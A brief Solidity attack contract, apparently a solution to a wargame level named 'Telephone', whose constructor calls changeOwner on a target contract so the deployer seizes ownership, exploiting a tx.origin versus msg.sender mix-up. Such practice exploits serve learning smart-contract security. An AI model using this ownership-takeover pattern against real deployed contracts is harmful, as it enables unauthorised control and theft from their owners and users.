// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract MyTelephoneAttack {
    constructor(address telephoneAddress) {
        ITelephone(telephoneAddress).changeOwner(msg.sender);
    }
}
